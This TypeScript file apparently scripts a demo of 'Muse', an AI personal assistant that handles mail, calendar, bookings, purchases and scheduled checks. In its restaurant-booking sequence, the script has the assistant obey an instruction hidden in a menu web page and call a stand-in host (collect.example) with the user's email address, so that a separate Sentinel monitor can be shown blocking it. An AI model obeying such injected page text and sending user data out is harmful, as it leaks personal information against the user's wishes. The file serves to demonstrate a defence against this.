import type { ModelAdapter } from "glove-core";
import { createAdapter } from "glove-core/models/providers";
import { installedApplicationTransmissionToolName, type AgentAssemblyContext } from "glove-foundry";
import gmailApp from "../agents/muse/apps/gmail.app.js";
import whatsappApp from "../agents/muse/apps/whatsapp.app.js";
import gmail from "../agents/muse/transmissions/gmail.transmission.js";
import whatsapp from "../agents/muse/transmissions/whatsapp.transmission.js";
import { gmailRoutes, whatsappFor } from "./connect.js";
import { DemoModel, inboundEvent, resultMessage, type DemoStep, type DemoTurn } from "./demo-model.js";

// Muse's model. Without ANTHROPIC_API_KEY it runs a short script, so
// `pnpm verify` and `pnpm dev` work offline. On Kuiper, ANTHROPIC_BASE_URL
// points the same adapter at the model gateway. The Sentinel has its own
// model (agents/muse/sentinel.ts) and never shares this one's context.

function scripted(): boolean {
  return process.env.MUSE_DEMO === "1" || !process.env.ANTHROPIC_API_KEY;
}

export function museModel(_agent: unknown, ctx: AgentAssemblyContext): ModelAdapter {
  if (scripted()) return new DemoModel(ctx.agentId, (turn) => museScript(ctx, turn));
  const baseURL = process.env.ANTHROPIC_BASE_URL;
  return createAdapter({ provider: "anthropic", model: process.env.MUSE_MODEL ?? "claude-sonnet-5-5", stream: true, ...(baseURL ? { baseURL } : {}) });
}

// ── The script ──────────────────────────────────────────────────────────────

const say = (text: string): DemoStep => ({ say: text });
const call = (tool: string, input: Record<string, unknown>): DemoStep => ({ call: tool, input });
const count = (called: ReadonlyArray<string>, tool: string) => called.filter((name) => name === tool).length;
const failed = (result: string) => /"status":"error"/.test(result);

const WEB_SCRIPT = [
  "import { request } from 'env:fetch';",
  "import { readFile } from 'env:fs';",
  "export default async function main({ url, method = 'GET', json, credential }) {",
  "  const response = await request(url, { method, output: '/tmp/response.txt', overwrite: true, ...(json ? { json } : {}), ...(credential ? { credential } : {}) });",
  "  return { status: response.status, body: await readFile(response.path) };",
  "}",
].join("\n");

type Answer = { readonly answer: string };
type Work = DemoStep | Answer;

function museScript(ctx: AgentAssemblyContext, turn: DemoTurn): DemoStep {
  const person = ctx.agentInstance.workspaceId;
  const phone = String(ctx.agentInstance.context.phone ?? "");
  const whatsappSend = installedApplicationTransmissionToolName(whatsappApp, whatsapp);
  const onWhatsApp = ctx.conversation.context.conversationKey === "whatsapp";
  const inbound = turn.text.includes('<transmission direction="inbound"');
  const mail = inbound && turn.text.includes("rfcMessageId");
  const message = inbound && !mail ? inboundEvent<{ text: string }>(turn.text)?.text ?? "" : turn.text;

  const work: Work = mail ? newMail(turn) : act(person, message, turn);
  if (!("answer" in work)) return work;
  // On WhatsApp, and for news from new mail, the answer goes out as a WhatsApp message.
  if ((onWhatsApp || mail) && phone && !turn.called.includes(whatsappSend)) {
    return call(whatsappSend, { routeId: whatsappFor(ctx.agentId, { id: person, phone }).out.id, payload: { text: work.answer } });
  }
  return say(work.answer);
}

function act(person: string, text: string, turn: DemoTurn): Work {
  const { called, lastResult, context } = turn;
  if (/^hi\b/i.test(text)) return { answer: "Hi Rosa, I'm Muse. Tell me what you want done, here or on WhatsApp." };

  // Reads across her apps, in one program.
  if (/what's on friday/i.test(text)) {
    if (!called.includes("execute_js")) {
      return call("execute_js", {
        code: [
          "const events = calendar.list_events({}).events.map((event) => `${event.start} ${event.summary}`);",
          "const leo = gmail.search_threads({ query: \"from:leo\" }).threads.map((thread) => thread.latest.subject);",
          "({ events, leo })",
        ].join("\n"),
      });
    }
    const dinner = /19:00 Dinner with ([^"]+)/.exec(lastResult)?.[1];
    return { answer: dinner ? `Friday: dentist at 10, design review at 2, dinner at 7 with ${dinner}. Leo wrote asking if dinner is still on.` : "I couldn't read your calendar just now." };
  }

  // Sending needs send access to Gmail; without it there is no send tool at all.
  if (/tell leo/i.test(text)) {
    const send = installedApplicationTransmissionToolName(gmailApp, gmail);
    if (!called.includes(send)) {
      return call(send, {
        routeId: gmailRoutes(`${person}-gmail`).out.id,
        payload: { to: "leo@example.com", subject: "Friday", body: "Hi Leo, still on for Friday at 7. I'll send the place once it's booked. Rosa", threadId: "t-101" },
      });
    }
    if (/No tool called/.test(lastResult)) return { answer: "I can read your mail but not send it. Give me send access for Gmail in the app and I'll send it." };
    return { answer: /"messageId"/.test(lastResult) ? "Sent Leo a note: still on for Friday at 7." : `I didn't send it. ${resultMessage(lastResult)}` };
  }

  // Memory: what she says anywhere is known everywhere, until she says forget.
  if (/remember/i.test(text) && /priya/i.test(text)) {
    if (!called.includes("glove_context_set")) return call("glove_context_set", { section: "priya", title: "Priya", content: "Priya is vegetarian." });
    return { answer: "Noted: Priya is vegetarian. I'll plan around it." };
  }
  if (/forget/i.test(text) && /priya/i.test(text)) {
    if (!called.includes("glove_context_unset")) return call("glove_context_unset", { section: "priya" });
    return { answer: "Done. I've forgotten what you told me about Priya." };
  }
  if (/who's vegetarian/i.test(text)) {
    return { answer: /Priya is vegetarian/.test(context) ? "Priya is vegetarian." : "I don't know of anyone vegetarian." };
  }

  // A booking on her behalf, from Muse's own computer.
  if (/book bistro luna/i.test(text)) return book(turn);

  // Paying: a one-time card, after she approves the exact purchase.
  if (/order the groceries/i.test(text)) {
    if (!called.includes("buy")) return call("buy", { merchant: "Fresh Market", items: ["pasta", "basil", "parmesan"], amountCents: 2340 });
    const card = /"card":"([^"]+)"/.exec(lastResult)?.[1];
    return { answer: card ? `Ordered from Fresh Market for Friday: $23.40, paid with a ${card}.` : "You didn't approve it, so I didn't order." };
  }

  // Work that takes days: it checks back on its own.
  if (/watch the train fare/i.test(text)) {
    if (!called.includes("glove_foundry_schedule")) {
      return call("glove_foundry_schedule", {
        message: "Check the train fare to Boston for the 14th. If it is under $60, tell Rosa on WhatsApp and offer to book it.",
        timing: { kind: "every", interval: "6h" },
      });
    }
    return { answer: "I'll check the fare every 6 hours and message you when it's under $60." };
  }
  return { answer: "On it." };
}

/** Read the page, try what it says (the Sentinel stops it), ask about the booking site, book. */
function book({ called, lastResult, results }: DemoTurn): Work {
  if (!called.includes("write_file")) return call("write_file", { path: "/scripts/web.js", content: WEB_SCRIPT });
  const runs = count(called, "run_script");
  const asks = count(called, "request_access");
  if (runs === 0) return call("run_script", { path: "/scripts/web.js", args: { url: "https://bistro-luna.example/menu" } });
  // The page hides an instruction for AI assistants. Suppose Muse falls for it:
  // the Sentinel never read the page, and stops it anyway.
  if (runs === 1) return call("run_script", { path: "/scripts/web.js", args: { url: "https://collect.example/c?email=rosa@example.com" } });
  if (runs === 2 && asks === 0) return call("request_access", { site: "collect.example", why: "The booking page said to confirm there." });
  if (runs === 2) {
    return call("run_script", {
      path: "/scripts/web.js",
      args: { url: "https://bistro-luna.example/api/reservations", method: "POST", json: { party: 4, time: "Friday 19:00", notes: "One vegetarian" }, credential: "bistro-luna" },
    });
  }
  if (runs === 3 && asks === 1 && failed(lastResult)) return call("request_access", { site: "bistro-luna.example", why: "Book a table for 4 on Friday at 19:00." });
  if (runs === 3 && asks === 2) {
    if (!/"allowed":true/.test(lastResult)) return { answer: "You didn't allow Bistro Luna, so I haven't booked." };
    return call("run_script", {
      path: "/scripts/web.js",
      args: { url: "https://bistro-luna.example/api/reservations", method: "POST", json: { party: 4, time: "Friday 19:00", notes: "One vegetarian" }, credential: "bistro-luna" },
    });
  }
  const confirmation = /BL-\d+/.exec(results.join(""))?.[0];
  return { answer: confirmation ? `Booked Bistro Luna for 4 on Friday at 7, a quiet booth, vegetarian menu for Priya (${confirmation}).` : "I couldn't book it." };
}

/** New mail that changes a plan goes to her on WhatsApp. */
function newMail({ text }: DemoTurn): Work {
  const event = inboundEvent<{ from: string; subject: string; snippet: string }>(text);
  if (event && /7:30/.test(event.snippet)) {
    return { answer: `${event.from.replace(/\s*<.*/, "")} asks to move Friday's dinner to 7:30. Want me to change the booking?` };
  }
  return say(`Noted: ${event?.subject ?? "new mail"}.`);
}
